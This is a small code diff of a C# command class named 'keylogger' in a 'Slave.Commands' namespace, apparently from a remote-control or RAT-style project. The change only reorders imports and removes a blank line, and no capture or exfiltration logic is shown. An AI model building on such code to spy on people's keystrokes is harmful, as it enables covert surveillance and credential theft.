@@ -1,6 +1,6 @@
-﻿using System.Collections.Generic;
-using Shared;
+﻿using Shared;
 using Slave.Commands.Core;
+using System.Collections.Generic;
 
 namespace Slave.Commands.KeyLogger
 {
@@ -9,7 +9,6 @@ namespace Slave.Commands.KeyLogger
         public string name { get; } = "keylogger";
 
         public KeyLoggerManager keyLoggerManager { get; set; } = new KeyLoggerManager();
-        
 
         public void Process(List<string> args)
         {
